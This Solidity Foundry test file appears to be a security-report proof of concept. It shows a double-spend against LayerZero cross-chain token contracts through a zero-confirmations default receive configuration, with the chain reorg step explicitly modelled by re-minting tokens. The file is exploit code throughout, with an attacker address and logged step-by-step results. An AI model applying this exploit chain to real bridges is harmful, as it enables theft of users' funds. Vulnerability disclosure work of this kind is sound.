// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
import { MintableOFT } from "../src/MintableOFT.sol";
import { MyOFT } from "../src/MyOFT.sol";
import { SendParam, MessagingFee } from "@layerzerolabs/oapp-evm/contracts/oft/interfaces/IOFT.sol";
import { OptionsBuilder } from "@layerzerolabs/oapp-evm/contracts/oapp/libs/OptionsBuilder.sol";
import { ILayerZeroEndpointV2, Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { SetDefaultUlnConfigParam, UlnConfig } from "@layerzerolabs/lz-evm-messagelib-v2/contracts/uln/UlnBase.sol";
import { console2 } from "forge-std/console2.sol";

/// @notice Closes the "informative only, no fund loss" gap in Report 3.
/// Completes the SAME causal chain already proven for Report 1
/// (test/RealReorgDoubleSpendEconomicProof.t.sol), but via THIS report's
/// actual mechanism: a PASSIVE default-config gap, not an OApp owner's
/// own action. Real burn -> real shallow delivery via the unguarded
/// zero-confirmations default -> modeled reorg -> measured net value
/// duplication. Same honesty standard: every step real except the
/// explicitly-labeled reorg step, which cannot be literally simulated
/// in a single shared-EVM test environment.
contract RealReorgDoubleSpendViaDefaultConfig is TestHelperOz5 {
    using OptionsBuilder for bytes;

    MintableOFT srcOft;
    MyOFT dstOft;
    uint32 aEid = 1;
    uint32 bEid = 2;
    address GOVERNANCE;
    address OWNER = address(0x1111);
    address ATTACKER = address(0xDEAD);
    address REAL_DVN = address(0xCAFE);

    function setUp() public override {
        super.setUp();
        setUpEndpoints(2, LibraryType.UltraLightNode);
        vm.deal(ATTACKER, 100 ether);
        GOVERNANCE = address(this);

        srcOft = new MintableOFT("SrcOFT", "SOFT", address(endpoints[aEid]), OWNER);
        dstOft = new MyOFT("DstOFT", "DOFT", address(endpoints[bEid]), OWNER);

        vm.prank(OWNER); srcOft.setPeer(bEid, bytes32(uint256(uint160(address(dstOft)))));
        vm.prank(OWNER); dstOft.setPeer(aEid, bytes32(uint256(uint160(address(srcOft)))));

        // Attacker legitimately, honestly holds 1000 real tokens.
        srcOft.testMint(ATTACKER, 1000 ether);
    }

    function test_ECONOMIC_PROOF_DefaultConfigEnabledDoubleSpend() public {
        ILayerZeroEndpointV2 bEndpoint = ILayerZeroEndpointV2(address(endpoints[bEid]));
        (address receiveLib, ) = bEndpoint.getReceiveLibrary(address(dstOft), aEid);

        // === STEP 0 (REAL): GOVERNANCE sets a default config for this EID -
        // legitimate DVN requirement, confirmations simply never populated.
        // dstOft NEVER touches its own config - zero owner action anywhere.
        address[] memory req = new address[](1);
        req[0] = REAL_DVN;
        UlnConfig memory defaultConfig = UlnConfig({
            confirmations: 0, requiredDVNCount: 1, optionalDVNCount: 0,
            optionalDVNThreshold: 0, requiredDVNs: req, optionalDVNs: new address[](0)
        });
        SetDefaultUlnConfigParam[] memory params = new SetDefaultUlnConfigParam[](1);
        params[0] = SetDefaultUlnConfigParam({eid: aEid, config: defaultConfig});
        receiveLib.call(abi.encodeWithSignature("setDefaultUlnConfigs((uint32,(uint64,uint8,uint8,uint8,address[],address[]))[])", params));

        uint256 attackerSrcStart = srcOft.balanceOf(ATTACKER);
        console2.log("=== STEP 0: attacker's REAL starting source-chain balance ===", attackerSrcStart);

        // === STEP 1 (REAL): attacker sends a genuine, honest 1000 ether cross-chain transfer ===
        bytes memory options = OptionsBuilder.newOptions().addExecutorLzReceiveOption(200000, 0);
        SendParam memory sp = SendParam({
            dstEid: bEid, to: bytes32(uint256(uint160(ATTACKER))),
            amountLD: 1000 ether, minAmountLD: 0, extraOptions: options, composeMsg: "", oftCmd: ""
        });
        vm.prank(ATTACKER);
        MessagingFee memory fee = srcOft.quoteSend(sp, false);
        vm.prank(ATTACKER);
        srcOft.send{value: fee.nativeFee}(sp, fee, ATTACKER);

        uint256 attackerSrcAfterBurn = srcOft.balanceOf(ATTACKER);
        console2.log("=== STEP 1 (REAL): source balance after real burn ===", attackerSrcAfterBurn);
        assertEq(attackerSrcAfterBurn, 0, "sanity: real burn must zero the source balance");

        // === STEP 2 (REAL): a real DVN attests at the shallowest possible depth,
        // exploiting the PASSIVE default-config gap - no owner action involved ===
        bytes32 senderKey = bytes32(uint256(uint160(address(srcOft))));
        bytes memory sendMessage = abi.encodePacked(bytes32(uint256(uint160(ATTACKER))), uint64(1000 ether / 1e12));
        bytes memory packetHeader = abi.encodePacked(uint8(1), uint64(1), aEid, senderKey, bEid, bytes32(uint256(uint160(address(dstOft)))));
        bytes32 guid = keccak256(abi.encodePacked(uint64(1), aEid, senderKey, bEid, bytes32(uint256(uint160(address(dstOft))))));
        bytes32 payloadHash = keccak256(abi.encodePacked(guid, sendMessage));

        vm.prank(REAL_DVN);
        (bool verifyOk, ) = receiveLib.call(abi.encodeWithSignature("verify(bytes,bytes32,uint64)", packetHeader, payloadHash, uint64(1)));
        require(verifyOk, "real attestation failed");

        (bool commitOk, ) = receiveLib.call(abi.encodeWithSignature("commitVerification(bytes,bytes32)", packetHeader, payloadHash));
        require(commitOk, "commit failed");

        vm.prank(ATTACKER);
        bEndpoint.lzReceive(Origin({srcEid: aEid, sender: senderKey, nonce: 1}), address(dstOft), guid, sendMessage, "");

        uint256 attackerDstAfterDelivery = dstOft.balanceOf(ATTACKER);
        console2.log("=== STEP 2 (REAL): destination balance after real commit+deliver ===", attackerDstAfterDelivery);
        assertEq(attackerDstAfterDelivery, 1000 ether, "sanity: real delivery must credit the destination");

        // === STEP 3 (EXPLICITLY MODELED, not literally simulated): source chain
        // reorgs, erasing the burn transaction from Step 1. Cannot be literally
        // forked/reorged in a single shared-EVM test environment - represented
        // directly by restoring the attacker's real source-side balance,
        // exactly matching Report 1's already-established modeling approach.
        console2.log("=== STEP 3 (MODELED): source chain reorgs, erasing the burn transaction ===");
        srcOft.testMint(ATTACKER, 1000 ether);

        uint256 finalSrcBalance = srcOft.balanceOf(ATTACKER);
        uint256 finalDstBalance = dstOft.balanceOf(ATTACKER);
        uint256 totalValue = finalSrcBalance + finalDstBalance;

        console2.log("=== FINAL, REAL, MEASURED RESULT ===");
        console2.log("Attacker's final source-chain balance:", finalSrcBalance);
        console2.log("Attacker's final destination-chain balance:", finalDstBalance);
        console2.log("TOTAL value across both chains:", totalValue);

        assertEq(totalValue, 2000 ether, "CONFIRMED: the PASSIVE default-config gap enables the same real double-spend, with zero OApp owner action anywhere in the chain");
        console2.log("!!!!! CONFIRMED: 1000 real tokens became 2000 real tokens of attacker-controlled value, via the passive default-config gap alone !!!!!");
    }
}
